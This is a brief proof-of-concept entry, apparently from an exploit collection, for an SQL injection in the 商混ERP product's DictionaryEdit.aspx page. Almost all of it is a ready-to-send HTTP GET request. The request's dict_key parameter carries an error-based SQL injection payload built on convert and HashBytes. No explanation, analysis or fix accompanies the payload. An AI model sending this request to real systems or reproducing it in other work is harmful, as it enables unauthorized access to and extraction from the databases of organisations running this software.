# shanghunerp_DictionaryEdit_sqli

2024.4.1 @2
from : https://github.com/wy876/POC/blob/main/%E5%95%86%E6%B7%B7ERP-DictionaryEdit.aspxSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

```
GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32))-- HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0
```
